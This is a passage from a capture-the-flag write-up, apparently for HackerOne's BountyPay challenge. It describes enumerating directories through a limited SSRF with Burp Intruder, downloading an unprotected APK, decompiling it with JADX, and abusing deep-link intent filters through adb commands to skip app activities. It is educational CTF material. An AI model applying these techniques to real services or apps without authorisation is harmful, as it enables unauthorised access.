<a id="__codelineno-28-16" name="__codelineno-28-16" href="#__codelineno-28-16"></a>            <span class="p">&lt;</span><span class="nt">form</span> <span class="na">method</span><span class="o">=</span><span class="s">&quot;post&quot;</span> <span class="na">action</span><span class="o">=</span><span class="s">&quot;/&quot;</span><span class="p">&gt;</span>
<a id="__codelineno-28-17" name="__codelineno-28-17" href="#__codelineno-28-17"></a>                <span class="p">&lt;</span><span class="nt">div</span> <span class="na">class</span><span class="o">=</span><span class="s">&quot;panel panel-default&quot;</span> <span class="na">style</span><span class="o">=</span><span class="s">&quot;margin-top:50px&quot;</span><span class="p">&gt;</span>
<a id="__codelineno-28-18" name="__codelineno-28-18" href="#__codelineno-28-18"></a>                    <span class="p">&lt;</span><span class="nt">div</span> <span class="na">class</span><span class="o">=</span><span class="s">&quot;panel-heading&quot;</span><span class="p">&gt;</span>Login<span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
<a id="__codelineno-28-19" name="__codelineno-28-19" href="#__codelineno-28-19"></a>                    <span class="p">&lt;</span><span class="nt">div</span> <span class="na">class</span><span class="o">=</span><span class="s">&quot;panel-body&quot;</span><span class="p">&gt;</span>
<a id="__codelineno-28-20" name="__codelineno-28-20" href="#__codelineno-28-20"></a>                        <span class="p">&lt;</span><span class="nt">div</span> <span class="na">style</span><span class="o">=</span><span class="s">&quot;margin-top:7px&quot;</span><span class="p">&gt;&lt;</span><span class="nt">label</span><span class="p">&gt;</span>Username:<span class="p">&lt;/</span><span class="nt">label</span><span class="p">&gt;&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
<a id="__codelineno-28-21" name="__codelineno-28-21" href="#__codelineno-28-21"></a>                        <span class="p">&lt;</span><span class="nt">div</span><span class="p">&gt;&lt;</span><span class="nt">input</span> <span class="na">name</span><span class="o">=</span><span class="s">&quot;username&quot;</span> <span class="na">class</span><span class="o">=</span><span class="s">&quot;form-control&quot;</span><span class="p">&gt;&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
<a id="__codelineno-28-22" name="__codelineno-28-22" href="#__codelineno-28-22"></a>                        <span class="p">&lt;</span><span class="nt">div</span> <span class="na">style</span><span class="o">=</span><span class="s">&quot;margin-top:7px&quot;</span><span class="p">&gt;&lt;</span><span class="nt">label</span><span class="p">&gt;</span>Password:<span class="p">&lt;/</span><span class="nt">label</span><span class="p">&gt;&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
<a id="__codelineno-28-23" name="__codelineno-28-23" href="#__codelineno-28-23"></a>                        <span class="p">&lt;</span><span class="nt">div</span><span class="p">&gt;&lt;</span><span class="nt">input</span> <span class="na">name</span><span class="o">=</span><span class="s">&quot;password&quot;</span> <span class="na">type</span><span class="o">=</span><span class="s">&quot;password&quot;</span> <span class="na">class</span><span class="o">=</span><span class="s">&quot;form-control&quot;</span><span class="p">&gt;&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
<a id="__codelineno-28-24" name="__codelineno-28-24" href="#__codelineno-28-24"></a>                    <span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
<a id="__codelineno-28-25" name="__codelineno-28-25" href="#__codelineno-28-25"></a>                <span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
<a id="__codelineno-28-26" name="__codelineno-28-26" href="#__codelineno-28-26"></a>                <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&quot;submit&quot;</span> <span class="na">class</span><span class="o">=</span><span class="s">&quot;btn btn-success pull-right&quot;</span> <span class="na">value</span><span class="o">=</span><span class="s">&quot;Login&quot;</span><span class="p">&gt;</span>
<a id="__codelineno-28-27" name="__codelineno-28-27" href="#__codelineno-28-27"></a>            <span class="p">&lt;/</span><span class="nt">form</span><span class="p">&gt;</span>
<a id="__codelineno-28-28" name="__codelineno-28-28" href="#__codelineno-28-28"></a>        <span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
<a id="__codelineno-28-29" name="__codelineno-28-29" href="#__codelineno-28-29"></a>    <span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
<a id="__codelineno-28-30" name="__codelineno-28-30" href="#__codelineno-28-30"></a><span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
<a id="__codelineno-28-31" name="__codelineno-28-31" href="#__codelineno-28-31"></a><span class="p">&lt;</span><span class="nt">script</span> <span class="na">src</span><span class="o">=</span><span class="s">&quot;/js/jquery.min.js&quot;</span><span class="p">&gt;&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
<a id="__codelineno-28-32" name="__codelineno-28-32" href="#__codelineno-28-32"></a><span class="p">&lt;</span><span class="nt">script</span> <span class="na">src</span><span class="o">=</span><span class="s">&quot;/js/bootstrap.min.js&quot;</span><span class="p">&gt;&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
<a id="__codelineno-28-33" name="__codelineno-28-33" href="#__codelineno-28-33"></a><span class="p">&lt;/</span><span class="nt">body</span><span class="p">&gt;</span>
<a id="__codelineno-28-34" name="__codelineno-28-34" href="#__codelineno-28-34"></a><span class="p">&lt;/</span><span class="nt">html</span><span class="p">&gt;</span>
</code></pre></div>
<p>Since our SSRF is pretty limited (we can only do GET requests), the next logical step is to do more enumerations. For this we can use Burp Intruder with Hackvertor to dynamically base64 encode the payload.</p>
<p><img alt="Burp Intruder configuration" loading="lazy" src="../h12006-ctf-writeup/Screenshot%202020-06-03%20at%2020.34.48.png" /></p>
<p>The "Directories - short" gives us some interesting results:</p>
<p><img alt="Intruder results" loading="lazy" src="../h12006-ctf-writeup/Screenshot%202020-06-03%20at%2020.33.39.png" /></p>
<p>It appears that there is an apk in the sources directory. The <a href="https://software.bountypay.h1ctf.com/uploads/BountyPay.apk">apk</a> can be retrieved as there are no access control !</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-29-1" name="__codelineno-29-1" href="#__codelineno-29-1"></a>http get https://software.bountypay.h1ctf.com/uploads/BountyPay.apk
</code></pre></div>
<div class="highlight"><pre><span></span><code><a id="__codelineno-30-1" name="__codelineno-30-1" href="#__codelineno-30-1"></a><span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span> <span class="m">200</span> <span class="ne">OK</span>
<a id="__codelineno-30-2" name="__codelineno-30-2" href="#__codelineno-30-2"></a><span class="na">Connection</span><span class="o">:</span> <span class="l">keep-alive</span>
<a id="__codelineno-30-3" name="__codelineno-30-3" href="#__codelineno-30-3"></a><span class="na">Content-Type</span><span class="o">:</span> <span class="l">application/octet-stream</span>
<a id="__codelineno-30-4" name="__codelineno-30-4" href="#__codelineno-30-4"></a><span class="na">Date</span><span class="o">:</span> <span class="l">Thu, 04 Jun 2020 17:12:44 GMT</span>
<a id="__codelineno-30-5" name="__codelineno-30-5" href="#__codelineno-30-5"></a><span class="na">Server</span><span class="o">:</span> <span class="l">nginx/1.14.0 (Ubuntu)</span>
<a id="__codelineno-30-6" name="__codelineno-30-6" href="#__codelineno-30-6"></a><span class="na">Transfer-Encoding</span><span class="o">:</span> <span class="l">chunked</span>
<a id="__codelineno-30-7" name="__codelineno-30-7" href="#__codelineno-30-7"></a>
<a id="__codelineno-30-8" name="__codelineno-30-8" href="#__codelineno-30-8"></a>
<a id="__codelineno-30-9" name="__codelineno-30-9" href="#__codelineno-30-9"></a>
<a id="__codelineno-30-10" name="__codelineno-30-10" href="#__codelineno-30-10"></a>+-----------------------------------------+
<a id="__codelineno-30-11" name="__codelineno-30-11" href="#__codelineno-30-11"></a>| NOTE: binary data not shown in terminal |
<a id="__codelineno-30-12" name="__codelineno-30-12" href="#__codelineno-30-12"></a>+-----------------------------------------+
</code></pre></div>
<h2 id="android-reverse-engineering">Android Reverse Engineering<a class="headerlink" href="#android-reverse-engineering" title="Permanent link">&para;</a></h2>
<p>Let's start by decompiling the APK using <a href="https://github.com/skylot/jadx">JADX</a> which is a Dex to Java decompiler:</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-31-1" name="__codelineno-31-1" href="#__codelineno-31-1"></a>jadx BountyPay.apk
</code></pre></div>
<p>In our case the interesting files are going to be in <code>/sources/bounty</code>:</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-32-1" name="__codelineno-32-1" href="#__codelineno-32-1"></a>/BountyPay/sources/bounty
<a id="__codelineno-32-2" name="__codelineno-32-2" href="#__codelineno-32-2"></a>└── pay
<a id="__codelineno-32-3" name="__codelineno-32-3" href="#__codelineno-32-3"></a>    ├── BuildConfig.java
<a id="__codelineno-32-4" name="__codelineno-32-4" href="#__codelineno-32-4"></a>    ├── CongratsActivity.java
<a id="__codelineno-32-5" name="__codelineno-32-5" href="#__codelineno-32-5"></a>    ├── MainActivity.java
<a id="__codelineno-32-6" name="__codelineno-32-6" href="#__codelineno-32-6"></a>    ├── PartOneActivity.java
<a id="__codelineno-32-7" name="__codelineno-32-7" href="#__codelineno-32-7"></a>    ├── PartThreeActivity.java
<a id="__codelineno-32-8" name="__codelineno-32-8" href="#__codelineno-32-8"></a>    ├── PartTwoActivity.java
<a id="__codelineno-32-9" name="__codelineno-32-9" href="#__codelineno-32-9"></a>    └── R.java
<a id="__codelineno-32-10" name="__codelineno-32-10" href="#__codelineno-32-10"></a>
<a id="__codelineno-32-11" name="__codelineno-32-11" href="#__codelineno-32-11"></a>1 directory, 7 files
</code></pre></div>
<p>We can see that there is one MainActivity and three activities named PartOne, PartTwo and PartThree.</p>
<p>Looking at the Manifest we can see that there are actually 5 activities define:</p>
<ul>
<li>bounty.pay.MainActivity</li>
<li>bounty.pay.PartOneActivity</li>
<li>bounty.pay.PartTwoActivity</li>
<li>bounty.pay.PartThreeActivity</li>
<li>bounty.pay.CongratsActivity</li>
</ul>
<div class="highlight"><span class="filename">AndroidManifest.xml</span><pre><span></span><code><a id="__codelineno-33-1" name="__codelineno-33-1" href="#__codelineno-33-1"></a><span class="nt">&lt;activity</span><span class="w"> </span><span class="na">android:theme=</span><span class="s">&quot;@style/AppTheme.NoActionBar&quot;</span><span class="w"> </span><span class="na">android:label=</span><span class="s">&quot;@string/title_activity_congrats&quot;</span><span class="w"> </span><span class="na">android:name=</span><span class="s">&quot;bounty.pay.CongratsActivity&quot;</span><span class="nt">/&gt;</span>
<a id="__codelineno-33-2" name="__codelineno-33-2" href="#__codelineno-33-2"></a><span class="nt">&lt;activity</span><span class="w"> </span><span class="na">android:theme=</span><span class="s">&quot;@style/AppTheme.NoActionBar&quot;</span><span class="w"> </span><span class="na">android:label=</span><span class="s">&quot;@string/title_activity_part_three&quot;</span><span class="w"> </span><span class="na">android:name=</span><span class="s">&quot;bounty.pay.PartThreeActivity&quot;</span><span class="nt">&gt;</span>
<a id="__codelineno-33-3" name="__codelineno-33-3" href="#__codelineno-33-3"></a><span class="w">    </span><span class="nt">&lt;intent-filter</span><span class="w"> </span><span class="na">android:label=</span><span class="s">&quot;&quot;</span><span class="nt">&gt;</span>
<a id="__codelineno-33-4" name="__codelineno-33-4" href="#__codelineno-33-4"></a><span class="w">        </span><span class="nt">&lt;action</span><span class="w"> </span><span class="na">android:name=</span><span class="s">&quot;android.intent.action.VIEW&quot;</span><span class="nt">/&gt;</span>
<a id="__codelineno-33-5" name="__codelineno-33-5" href="#__codelineno-33-5"></a><span class="w">        </span><span class="nt">&lt;category</span><span class="w"> </span><span class="na">android:name=</span><span class="s">&quot;android.intent.category.DEFAULT&quot;</span><span class="nt">/&gt;</span>
<a id="__codelineno-33-6" name="__codelineno-33-6" href="#__codelineno-33-6"></a><span class="w">        </span><span class="nt">&lt;category</span><span class="w"> </span><span class="na">android:name=</span><span class="s">&quot;android.intent.category.BROWSABLE&quot;</span><span class="nt">/&gt;</span>
<a id="__codelineno-33-7" name="__codelineno-33-7" href="#__codelineno-33-7"></a><span class="w">        </span><span class="nt">&lt;data</span><span class="w"> </span><span class="na">android:scheme=</span><span class="s">&quot;three&quot;</span><span class="w"> </span><span class="na">android:host=</span><span class="s">&quot;part&quot;</span><span class="nt">/&gt;</span>
<a id="__codelineno-33-8" name="__codelineno-33-8" href="#__codelineno-33-8"></a><span class="w">    </span><span class="nt">&lt;/intent-filter&gt;</span>
<a id="__codelineno-33-9" name="__codelineno-33-9" href="#__codelineno-33-9"></a><span class="nt">&lt;/activity&gt;</span>
<a id="__codelineno-33-10" name="__codelineno-33-10" href="#__codelineno-33-10"></a><span class="nt">&lt;activity</span><span class="w"> </span><span class="na">android:theme=</span><span class="s">&quot;@style/AppTheme.NoActionBar&quot;</span><span class="w"> </span><span class="na">android:label=</span><span class="s">&quot;@string/title_activity_part_two&quot;</span><span class="w"> </span><span class="na">android:name=</span><span class="s">&quot;bounty.pay.PartTwoActivity&quot;</span><span class="nt">&gt;</span>
<a id="__codelineno-33-11" name="__codelineno-33-11" href="#__codelineno-33-11"></a><span class="w">    </span><span class="nt">&lt;intent-filter</span><span class="w"> </span><span class="na">android:label=</span><span class="s">&quot;&quot;</span><span class="nt">&gt;</span>
<a id="__codelineno-33-12" name="__codelineno-33-12" href="#__codelineno-33-12"></a><span class="w">        </span><span class="nt">&lt;action</span><span class="w"> </span><span class="na">android:name=</span><span class="s">&quot;android.intent.action.VIEW&quot;</span><span class="nt">/&gt;</span>
<a id="__codelineno-33-13" name="__codelineno-33-13" href="#__codelineno-33-13"></a><span class="w">        </span><span class="nt">&lt;category</span><span class="w"> </span><span class="na">android:name=</span><span class="s">&quot;android.intent.category.DEFAULT&quot;</span><span class="nt">/&gt;</span>
<a id="__codelineno-33-14" name="__codelineno-33-14" href="#__codelineno-33-14"></a><span class="w">        </span><span class="nt">&lt;category</span><span class="w"> </span><span class="na">android:name=</span><span class="s">&quot;android.intent.category.BROWSABLE&quot;</span><span class="nt">/&gt;</span>
<a id="__codelineno-33-15" name="__codelineno-33-15" href="#__codelineno-33-15"></a><span class="w">        </span><span class="nt">&lt;data</span><span class="w"> </span><span class="na">android:scheme=</span><span class="s">&quot;two&quot;</span><span class="w"> </span><span class="na">android:host=</span><span class="s">&quot;part&quot;</span><span class="nt">/&gt;</span>
<a id="__codelineno-33-16" name="__codelineno-33-16" href="#__codelineno-33-16"></a><span class="w">    </span><span class="nt">&lt;/intent-filter&gt;</span>
<a id="__codelineno-33-17" name="__codelineno-33-17" href="#__codelineno-33-17"></a><span class="nt">&lt;/activity&gt;</span>
<a id="__codelineno-33-18" name="__codelineno-33-18" href="#__codelineno-33-18"></a><span class="nt">&lt;activity</span><span class="w"> </span><span class="na">android:theme=</span><span class="s">&quot;@style/AppTheme.NoActionBar&quot;</span><span class="w"> </span><span class="na">android:label=</span><span class="s">&quot;@string/title_activity_part_one&quot;</span><span class="w"> </span><span class="na">android:name=</span><span class="s">&quot;bounty.pay.PartOneActivity&quot;</span><span class="nt">&gt;</span>
<a id="__codelineno-33-19" name="__codelineno-33-19" href="#__codelineno-33-19"></a><span class="w">    </span><span class="nt">&lt;intent-filter</span><span class="w"> </span><span class="na">android:label=</span><span class="s">&quot;&quot;</span><span class="nt">&gt;</span>
<a id="__codelineno-33-20" name="__codelineno-33-20" href="#__codelineno-33-20"></a><span class="w">        </span><span class="nt">&lt;action</span><span class="w"> </span><span class="na">android:name=</span><span class="s">&quot;android.intent.action.VIEW&quot;</span><span class="nt">/&gt;</span>
<a id="__codelineno-33-21" name="__codelineno-33-21" href="#__codelineno-33-21"></a><span class="w">        </span><span class="nt">&lt;category</span><span class="w"> </span><span class="na">android:name=</span><span class="s">&quot;android.intent.category.DEFAULT&quot;</span><span class="nt">/&gt;</span>
<a id="__codelineno-33-22" name="__codelineno-33-22" href="#__codelineno-33-22"></a><span class="w">        </span><span class="nt">&lt;category</span><span class="w"> </span><span class="na">android:name=</span><span class="s">&quot;android.intent.category.BROWSABLE&quot;</span><span class="nt">/&gt;</span>
<a id="__codelineno-33-23" name="__codelineno-33-23" href="#__codelineno-33-23"></a><span class="w">        </span><span class="nt">&lt;data</span><span class="w"> </span><span class="na">android:scheme=</span><span class="s">&quot;one&quot;</span><span class="w"> </span><span class="na">android:host=</span><span class="s">&quot;part&quot;</span><span class="nt">/&gt;</span>
<a id="__codelineno-33-24" name="__codelineno-33-24" href="#__codelineno-33-24"></a><span class="w">    </span><span class="nt">&lt;/intent-filter&gt;</span>
<a id="__codelineno-33-25" name="__codelineno-33-25" href="#__codelineno-33-25"></a><span class="nt">&lt;/activity&gt;</span>
<a id="__codelineno-33-26" name="__codelineno-33-26" href="#__codelineno-33-26"></a><span class="nt">&lt;activity</span><span class="w"> </span><span class="na">android:name=</span><span class="s">&quot;bounty.pay.MainActivity&quot;</span><span class="nt">&gt;</span>
<a id="__codelineno-33-27" name="__codelineno-33-27" href="#__codelineno-33-27"></a><span class="w">    </span><span class="nt">&lt;intent-filter&gt;</span>
<a id="__codelineno-33-28" name="__codelineno-33-28" href="#__codelineno-33-28"></a><span class="w">        </span><span class="nt">&lt;action</span><span class="w"> </span><span class="na">android:name=</span><span class="s">&quot;android.intent.action.MAIN&quot;</span><span class="nt">/&gt;</span>
<a id="__codelineno-33-29" name="__codelineno-33-29" href="#__codelineno-33-29"></a><span class="w">        </span><span class="nt">&lt;category</span><span class="w"> </span><span class="na">android:name=</span><span class="s">&quot;android.intent.category.LAUNCHER&quot;</span><span class="nt">/&gt;</span>
<a id="__codelineno-33-30" name="__codelineno-33-30" href="#__codelineno-33-30"></a><span class="w">    </span><span class="nt">&lt;/intent-filter&gt;</span>
<a id="__codelineno-33-31" name="__codelineno-33-31" href="#__codelineno-33-31"></a><span class="nt">&lt;/activity&gt;</span>
</code></pre></div>
<p>Something interesting to note is that PartOne, PartTwo and PartThree activities all defined an intent filter a scheme and an host:</p>
<ul>
<li>one://part</li>
<li>two://part</li>
<li>three://part</li>
</ul>
<p>Let's install the app on our favorite emulator (here I'm using <a href="https://developer.android.com/studio">Android Studio</a>'s emulator) using <a href="https://developer.android.com/studio/command-line/adb">adb</a>:</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-34-1" name="__codelineno-34-1" href="#__codelineno-34-1"></a>adb install BountyPay.apk
</code></pre></div>
<p>The fist screen invites us to enter a username and a Twitter handle.</p>
<p><img alt="BountyPay" loading="lazy" src="../h12006-ctf-writeup/Screenshot%202020-06-03%20at%2022.28.13.png" /></p>
<h3 id="partoneactivity">PartOneActivity<a class="headerlink" href="#partoneactivity" title="Permanent link">&para;</a></h3>
<p>The PartOne acitivity only has a button that gives use hints when we click on it:</p>
<ul>
<li>Deep links.</li>
<li>Params.</li>
</ul>
<div class="admonition info">
<p class="admonition-title">Info</p>
<p>Deeplinks are a concept that help users navigate between <strong>the web</strong> and <strong>applications.</strong> They are basically URLs which navigate users directly to the specific content in <strong>applications.</strong> Optionally, some data or parameter can be passed along.</p>
</div>
<p>When we look at the code we can see the corresponding code:</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-35-1" name="__codelineno-35-1" href="#__codelineno-35-1"></a><span class="kd">public</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">onClick</span><span class="p">(</span><span class="n">View</span><span class="w"> </span><span class="n">view</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<a id="__codelineno-35-2" name="__codelineno-35-2" href="#__codelineno-35-2"></a><span class="w">  </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">PartOneActivity</span><span class="p">.</span><span class="na">this</span><span class="p">.</span><span class="na">click</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="mi">0</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<a id="__codelineno-35-3" name="__codelineno-35-3" href="#__codelineno-35-3"></a><span class="w">    </span><span class="n">Snackbar</span><span class="p">.</span><span class="na">make</span><span class="p">(</span><span class="n">view</span><span class="p">,</span><span class="w"> </span><span class="p">(</span><span class="n">CharSequence</span><span class="p">)</span><span class="w"> </span><span class="s">&quot;Deep links.&quot;</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">)</span>
<a id="__codelineno-35-4" name="__codelineno-35-4" href="#__codelineno-35-4"></a><span class="w">    </span><span class="p">.</span><span class="na">setAction</span><span class="p">((</span><span class="n">CharSequence</span><span class="p">)</span><span class="w"> </span><span class="s">&quot;Action&quot;</span><span class="p">,</span><span class="w"> </span><span class="p">(</span><span class="n">View</span><span class="p">.</span><span class="na">OnClickListener</span><span class="p">)</span><span class="w"> </span><span class="kc">null</span><span class="p">)</span>
<a id="__codelineno-35-5" name="__codelineno-35-5" href="#__codelineno-35-5"></a><span class="w">    </span><span class="p">.</span><span class="na">show</span><span class="p">();</span>
<a id="__codelineno-35-6" name="__codelineno-35-6" href="#__codelineno-35-6"></a><span class="w">    </span><span class="n">PartOneActivity</span><span class="p">.</span><span class="na">this</span><span class="p">.</span><span class="na">click</span><span class="o">++</span><span class="p">;</span>
<a id="__codelineno-35-7" name="__codelineno-35-7" href="#__codelineno-35-7"></a><span class="w">  </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">PartOneActivity</span><span class="p">.</span><span class="na">this</span><span class="p">.</span><span class="na">click</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="mi">1</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<a id="__codelineno-35-8" name="__codelineno-35-8" href="#__codelineno-35-8"></a><span class="w">    </span><span class="n">Snackbar</span><span class="p">.</span><span class="na">make</span><span class="p">(</span><span class="n">view</span><span class="p">,</span><span class="w"> </span><span class="p">(</span><span class="n">CharSequence</span><span class="p">)</span><span class="w"> </span><span class="s">&quot;Params.&quot;</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">)</span>
<a id="__codelineno-35-9" name="__codelineno-35-9" href="#__codelineno-35-9"></a><span class="w">    </span><span class="p">.</span><span class="na">setAction</span><span class="p">((</span><span class="n">CharSequence</span><span class="p">)</span><span class="w"> </span><span class="s">&quot;Action&quot;</span><span class="p">,</span><span class="w"> </span><span class="p">(</span><span class="n">View</span><span class="p">.</span><span class="na">OnClickListener</span><span class="p">)</span><span class="w"> </span><span class="kc">null</span><span class="p">)</span>
<a id="__codelineno-35-10" name="__codelineno-35-10" href="#__codelineno-35-10"></a><span class="w">    </span><span class="p">.</span><span class="na">show</span><span class="p">();</span>
<a id="__codelineno-35-11" name="__codelineno-35-11" href="#__codelineno-35-11"></a><span class="w">    </span><span class="n">PartOneActivity</span><span class="p">.</span><span class="na">this</span><span class="p">.</span><span class="na">click</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span>
<a id="__codelineno-35-12" name="__codelineno-35-12" href="#__codelineno-35-12"></a><span class="w">  </span><span class="p">}</span>
<a id="__codelineno-35-13" name="__codelineno-35-13" href="#__codelineno-35-13"></a><span class="p">}</span>
</code></pre></div>
<p>Afterwards we can see that there are a few conditions to continue to the next activity:</p>
<ul>
<li>The setting should contains a username (set on the first screen)</li>
<li>A query parameter named <code>start</code> should be present with a value of <code>PartTwoActivity</code></li>
</ul>
<p>If all the condiditions are met the PartTwo activity is started.</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-36-1" name="__codelineno-36-1" href="#__codelineno-36-1"></a><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="n">settings</span><span class="p">.</span><span class="na">contains</span><span class="p">(</span><span class="s">&quot;USERNAME&quot;</span><span class="p">))</span><span class="w"> </span><span class="p">{</span>
<a id="__codelineno-36-2" name="__codelineno-36-2" href="#__codelineno-36-2"></a><span class="w">  </span><span class="n">Toast</span><span class="p">.</span><span class="na">makeText</span><span class="p">(</span><span class="n">getApplicationContext</span><span class="p">(),</span><span class="w"> </span><span class="s">&quot;Please create a CTF username :)&quot;</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">)</span>
<a id="__codelineno-36-3" name="__codelineno-36-3" href="#__codelineno-36-3"></a><span class="w">  </span><span class="p">.</span><span class="na">show</span><span class="p">();</span>
<a id="__codelineno-36-4" name="__codelineno-36-4" href="#__codelineno-36-4"></a><span class="w">  </span><span class="n">startActivity</span><span class="p">(</span><span class="k">new</span><span class="w"> </span><span class="n">Intent</span><span class="p">(</span><span class="k">this</span><span class="p">,</span><span class="w"> </span><span class="n">MainActivity</span><span class="p">.</span><span class="na">class</span><span class="p">));</span>
<a id="__codelineno-36-5" name="__codelineno-36-5" href="#__codelineno-36-5"></a><span class="p">}</span>
<a id="__codelineno-36-6" name="__codelineno-36-6" href="#__codelineno-36-6"></a><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">getIntent</span><span class="p">()</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="kc">null</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="n">getIntent</span><span class="p">().</span><span class="na">getData</span><span class="p">()</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="kc">null</span><span class="w"> </span>
<a id="__codelineno-36-7" name="__codelineno-36-7" href="#__codelineno-36-7"></a><span class="w">    </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="p">(</span><span class="n">firstParam</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">getIntent</span><span class="p">().</span><span class="na">getData</span><span class="p">().</span><span class="na">getQueryParameter</span><span class="p">(</span><span class="s">&quot;start&quot;</span><span class="p">))</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="kc">null</span><span class="w"> </span>
<a id="__codelineno-36-8" name="__codelineno-36-8" href="#__codelineno-36-8"></a><span class="w">    </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="n">firstParam</span><span class="p">.</span><span class="na">equals</span><span class="p">(</span><span class="s">&quot;PartTwoActivity&quot;</span><span class="p">)</span><span class="w"> </span>
<a id="__codelineno-36-9" name="__codelineno-36-9" href="#__codelineno-36-9"></a><span class="w">    </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="n">settings</span><span class="p">.</span><span class="na">contains</span><span class="p">(</span><span class="s">&quot;USERNAME&quot;</span><span class="p">))</span><span class="w"> </span><span class="p">{</span>
<a id="__codelineno-36-10" name="__codelineno-36-10" href="#__codelineno-36-10"></a>
<a id="__codelineno-36-11" name="__codelineno-36-11" href="#__codelineno-36-11"></a><span class="w">  </span><span class="n">String</span><span class="w"> </span><span class="n">user</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">settings</span><span class="p">.</span><span class="na">getString</span><span class="p">(</span><span class="s">&quot;USERNAME&quot;</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;&quot;</span><span class="p">);</span>
<a id="__codelineno-36-12" name="__codelineno-36-12" href="#__codelineno-36-12"></a><span class="w">  </span><span class="n">SharedPreferences</span><span class="p">.</span><span class="na">Editor</span><span class="w"> </span><span class="n">editor</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">settings</span><span class="p">.</span><span class="na">edit</span><span class="p">();</span>
<a id="__codelineno-36-13" name="__codelineno-36-13" href="#__codelineno-36-13"></a><span class="w">  </span><span class="n">String</span><span class="w"> </span><span class="n">twitterhandle</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">settings</span><span class="p">.</span><span class="na">getString</span><span class="p">(</span><span class="s">&quot;TWITTERHANDLE&quot;</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;&quot;</span><span class="p">);</span>
<a id="__codelineno-36-14" name="__codelineno-36-14" href="#__codelineno-36-14"></a><span class="w">  </span><span class="n">editor</span><span class="p">.</span><span class="na">putString</span><span class="p">(</span><span class="s">&quot;PARTONE&quot;</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;COMPLETE&quot;</span><span class="p">).</span><span class="na">apply</span><span class="p">();</span>
<a id="__codelineno-36-15" name="__codelineno-36-15" href="#__codelineno-36-15"></a><span class="w">  </span><span class="n">logFlagFound</span><span class="p">(</span><span class="n">user</span><span class="p">,</span><span class="w"> </span><span class="n">twitterhandle</span><span class="p">);</span>
<a id="__codelineno-36-16" name="__codelineno-36-16" href="#__codelineno-36-16"></a><span class="w">  </span><span class="n">startActivity</span><span class="p">(</span><span class="k">new</span><span class="w"> </span><span class="n">Intent</span><span class="p">(</span><span class="k">this</span><span class="p">,</span><span class="w"> </span><span class="n">PartTwoActivity</span><span class="p">.</span><span class="na">class</span><span class="p">));</span>
<a id="__codelineno-36-17" name="__codelineno-36-17" href="#__codelineno-36-17"></a><span class="p">}</span>
</code></pre></div>
<p>This can be done using adb using the following command:</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-37-1" name="__codelineno-37-1" href="#__codelineno-37-1"></a>adb shell am start -W -a android.intent.action.VIEW \
<a id="__codelineno-37-2" name="__codelineno-37-2" href="#__codelineno-37-2"></a>-d &quot;one://part?start=PartTwoActivity&quot; bounty.pay
<a id="__codelineno-37-3" name="__codelineno-37-3" href="#__codelineno-37-3"></a>Starting: Intent { act=android.intent.action.VIEW dat=one://part?start=PartTwoActivity pkg=bounty.pay }
<a id="__codelineno-37-4" name="__codelineno-37-4" href="#__codelineno-37-4"></a>Status: ok
<a id="__codelineno-37-5" name="__codelineno-37-5" href="#__codelineno-37-5"></a>Activity: bounty.pay/.PartOneActivity
<a id="__codelineno-37-6" name="__codelineno-37-6" href="#__codelineno-37-6"></a>ThisTime: 470
<a id="__codelineno-37-7" name="__codelineno-37-7" href="#__codelineno-37-7"></a>TotalTime: 470
<a id="__codelineno-37-8" name="__codelineno-37-8" href="#__codelineno-37-8"></a>WaitTime: 499
<a id="__codelineno-37-9" name="__codelineno-37-9" href="#__codelineno-37-9"></a>Complete
</code></pre></div>
<h3 id="parttwoactivity">PartTwoActivity<a class="headerlink" href="#parttwoactivity" title="Permanent link">&para;</a></h3>
<p>Here again we are presented with a white screen with a button giving us two hints:</p>
<ul>
